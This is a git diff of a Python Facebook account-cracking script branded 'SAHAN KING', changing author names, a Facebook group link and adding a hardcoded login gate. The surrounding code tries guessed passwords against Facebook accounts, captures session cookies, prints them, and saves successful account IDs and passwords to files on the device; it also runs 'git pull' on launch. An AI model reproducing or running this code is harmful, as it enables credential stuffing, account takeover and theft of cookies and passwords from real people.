@@ -1,5 +1,5 @@
-# Facebook: Sahan king
-# Github: SAHAN-KING
+# Facebook: SAHAN King
+# Github: SAHAN-King
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -90,10 +90,25 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://facebook.com/groups/935316144552550/')
+os.system('xdg-open https://facebook.com/groups/554714119911648/')
+import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+    username = input('Enter username: ')
+    password = input('Enter password: ')
+
+    if username == 'Sahan-king' and password == 'SAHAN-716':
+        print('You have successfully logged in.')
+        break
+    else:
+        print('Incorrect Please Trying ')
+        attemps += 1
+        continue
+os.system('clear')
 logo =("""\033[0;92m
 ╔═══════════════════════════════════════════════════╗
-\
 ░██████╗░█████╗░██╗░░██╗░█████╗░███╗░░██╗
 ██╔════╝██╔══██╗██║░░██║██╔══██╗████╗░██║
 ╚█████╗░███████║███████║███████║██╔██╗██║
@@ -101,8 +116,8 @@ logo =("""\033[0;92m
 ██████╔╝██║░░██║██║░░██║██║░░██║██║░╚███║
 ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
 \033[0;94m╠═══════════════════════════════════════════════════║
-\033[0;93m╠══[Author:=======================> \33[1;38mSAHAN KING\33[1;38m       ║\033[1;31m
-╠══[Facebook:=====================> Sahan King      ║  \033[1;97m
+\033[0;93m╠══[Author:=======================> \33[1;38mMR. SAHAN\33[1;38m       ║\033[1;31m
+╠══[Facebook:=====================> SAHAN KING      ║  \033[1;97m
 ╠══[Github:=======================> \33[1;38mSAHAN-KING      ║\33[1;34m
 ╠══[Whatsapp:=====================> 01401648565     ║\33[1;35m
 ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
@@ -252,22 +267,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[Sahan-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[SAHAN-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Sahan-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SAHAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/Sahan-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/SAHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}Sahan{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}SAHAN{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
